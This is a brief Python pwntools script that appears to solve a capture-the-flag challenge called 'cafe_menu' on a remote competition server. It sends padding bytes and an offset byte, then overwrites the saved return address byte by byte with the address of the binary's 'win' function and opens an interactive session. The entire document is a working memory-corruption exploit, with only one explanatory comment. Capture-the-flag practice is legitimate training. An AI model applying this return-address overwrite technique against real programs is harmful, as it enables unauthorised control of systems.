#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./cafe_menu', checksec=False)

#p = process(elf.path)
p = remote('offsec.m0lecon.it', 13539)

win = elf.sym.win
p.recvuntil(b"Enter today's specials (send 0xff to finish):\n")

for i in range(48):
    p.send(b"A")

p.send(bytes([71])) #71 not 72 due to data.idx++; to reach RIP

for bval in p64(win):
    p.send(bytes([bval]))

p.send(bytes([0xff]))
p.interactive()
